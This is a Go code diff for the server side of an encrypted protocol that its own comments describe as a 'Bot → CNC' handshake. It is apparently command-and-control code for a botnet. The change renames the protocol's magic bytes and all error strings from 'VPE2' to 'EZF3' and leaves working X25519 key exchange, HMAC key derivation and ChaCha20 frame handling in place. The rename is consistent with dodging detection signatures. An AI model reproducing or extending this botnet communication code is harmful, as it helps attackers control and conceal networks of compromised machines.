@@ -13,7 +13,7 @@ import (
 	"time"
 )
 
-// VPE2 encrypted TCP protocol — ChaCha20 stream cipher with HMAC framing,
+// EZF3 encrypted TCP protocol — ChaCha20 stream cipher with HMAC framing,
 // X25519 forward secrecy, and HMAC-SHA256 key derivation.
 
 // =========================================================================
@@ -34,7 +34,7 @@ func newChacha20(key [32]byte) *chacha20State {
 	return s
 }
 
-var errCounterOverflow = fmt.Errorf("VPE2: ChaCha20 counter overflow — reconnect required")
+var errCounterOverflow = fmt.Errorf("EZF3: ChaCha20 counter overflow — reconnect required")
 
 func (s *chacha20State) xor(data []byte) error {
 	for i := range data {
@@ -191,7 +191,7 @@ func computeHMAC(key [32]byte, data []byte) []byte {
 // Frame wire format: [2-byte len][encrypted(payload + HMAC)]
 func (c *CipherConn) WriteFrame(payload []byte) error {
 	if len(payload) > 0xFFFF {
-		return fmt.Errorf("VPE2: frame too large: %d bytes", len(payload))
+		return fmt.Errorf("EZF3: frame too large: %d bytes", len(payload))
 	}
 	c.sendMu.Lock()
 	defer c.sendMu.Unlock()
@@ -227,20 +227,20 @@ func (c *CipherConn) ReadFrame() ([]byte, error) {
 	// Read 2-byte length
 	var header [2]byte
 	if _, err := io.ReadFull(c.raw, header[:]); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to read frame header: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to read frame header: %w", err)
 	}
 	frameLen := int(header[0])<<8 | int(header[1])
 	if frameLen < hmacTagLen {
-		return nil, fmt.Errorf("VPE2: frame too short: %d", frameLen)
+		return nil, fmt.Errorf("EZF3: frame too short: %d", frameLen)
 	}
 	if frameLen > 0xFFFF+hmacTagLen {
-		return nil, fmt.Errorf("VPE2: frame too large: %d", frameLen)
+		return nil, fmt.Errorf("EZF3: frame too large: %d", frameLen)
 	}
 
 	// Read encrypted payload+hmac
 	ciphertext := make([]byte, frameLen)
 	if _, err := io.ReadFull(c.raw, ciphertext); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to read frame body: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to read frame body: %w", err)
 	}
 
 	// Decrypt
@@ -255,7 +255,7 @@ func (c *CipherConn) ReadFrame() ([]byte, error) {
 	// Verify HMAC
 	expectedTag := computeHMAC(c.hmacKey, payload)
 	if !hmac.Equal(receivedTag, expectedTag) {
-		return nil, fmt.Errorf("VPE2: HMAC verification failed")
+		return nil, fmt.Errorf("EZF3: HMAC verification failed")
 	}
 
 	return payload, nil
@@ -290,7 +290,7 @@ func (p *PrefixConn) SetWriteDeadline(t time.Time) error  { return p.conn.SetWri
 var _ net.Conn = (*PrefixConn)(nil)
 
 // =========================================================================
-// VPE2 Handshake — X25519 + HMAC-SHA256 key derivation
+// EZF3 Handshake — X25519 + HMAC-SHA256 key derivation
 // =========================================================================
 
 // hmacSHA256 computes HMAC-SHA256(key, message).
@@ -302,11 +302,11 @@ func hmacSHA256(key, message []byte) [32]byte {
 	return out
 }
 
-// HandleVPE2Handshake performs the VPE2 encrypted handshake.
+// HandleEZF3Handshake performs the EZF3 encrypted handshake.
 //
 // Protocol:
 //
-//	Bot → CNC:  "VPE2" (4B) + client_nonce (32B) + client_x25519_pub (32B)
+//	Bot → CNC:  "EZF3" (4B) + client_nonce (32B) + client_x25519_pub (32B)
 //	CNC → Bot:  server_nonce (32B) + server_x25519_pub (32B)
 //
 // Key derivation (HMAC-SHA256):
@@ -316,59 +316,59 @@ func hmacSHA256(key, message []byte) [32]byte {
 //	key_c2s       = HMAC-SHA256(session_key, "c2s")
 //	key_s2c       = HMAC-SHA256(session_key, "s2c")
 //	hmac_key      = HMAC-SHA256(session_key, "hmac")
-func HandleVPE2Handshake(conn net.Conn, magicCode string) (*CipherConn, error) {
+func HandleEZF3Handshake(conn net.Conn, magicCode string) (*CipherConn, error) {
 	conn.SetDeadline(time.Now().Add(10 * time.Second))
 
-	// Read and verify 4-byte magic "VPE2"
+	// Read and verify 4-byte magic "EZF3"
 	magic := make([]byte, 4)
 	if _, err := io.ReadFull(conn, magic); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to read magic: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to read magic: %w", err)
 	}
-	if string(magic) != "VPE2" {
-		return nil, fmt.Errorf("VPE2: bad magic: %x", magic)
+	if string(magic) != "EZF3" {
+		return nil, fmt.Errorf("EZF3: bad magic: %x", magic)
 	}
 
 	// Read 32-byte client nonce
 	clientNonce := make([]byte, 32)
 	if _, err := io.ReadFull(conn, clientNonce); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to read client nonce: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to read client nonce: %w", err)
 	}
 
 	// Read 32-byte client X25519 public key
 	clientPubBytes := make([]byte, 32)
 	if _, err := io.ReadFull(conn, clientPubBytes); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to read client X25519 pubkey: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to read client X25519 pubkey: %w", err)
 	}
 
 	// Generate server ephemeral X25519 keypair
 	serverPriv, err := ecdh.X25519().GenerateKey(rand.Reader)
 	if err != nil {
-		return nil, fmt.Errorf("VPE2: failed to generate X25519 key: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to generate X25519 key: %w", err)
 	}
 	serverPubBytes := serverPriv.PublicKey().Bytes()
 
 	// Parse client public key
 	clientPub, err := ecdh.X25519().NewPublicKey(clientPubBytes)
 	if err != nil {
-		return nil, fmt.Errorf("VPE2: invalid client X25519 pubkey: %w", err)
+		return nil, fmt.Errorf("EZF3: invalid client X25519 pubkey: %w", err)
 	}
 
 	// Compute X25519 shared secret
 	sharedSecret, err := serverPriv.ECDH(clientPub)
 	if err != nil {
-		return nil, fmt.Errorf("VPE2: X25519 ECDH failed: %w", err)
+		return nil, fmt.Errorf("EZF3: X25519 ECDH failed: %w", err)
 	}
 
 	// Generate and send server nonce + server X25519 public key
 	serverNonce := make([]byte, 32)
 	if _, err := rand.Read(serverNonce); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to generate server nonce: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to generate server nonce: %w", err)
 	}
 	response := make([]byte, 64)
 	copy(response[:32], serverNonce)
 	copy(response[32:], serverPubBytes)
 	if _, err := conn.Write(response); err != nil {
-		return nil, fmt.Errorf("VPE2: failed to send server response: %w", err)
+		return nil, fmt.Errorf("EZF3: failed to send server response: %w", err)
 	}
 
 	// Derive session key: HMAC-SHA256(MAGIC_CODE, client_nonce || server_nonce || shared_secret)
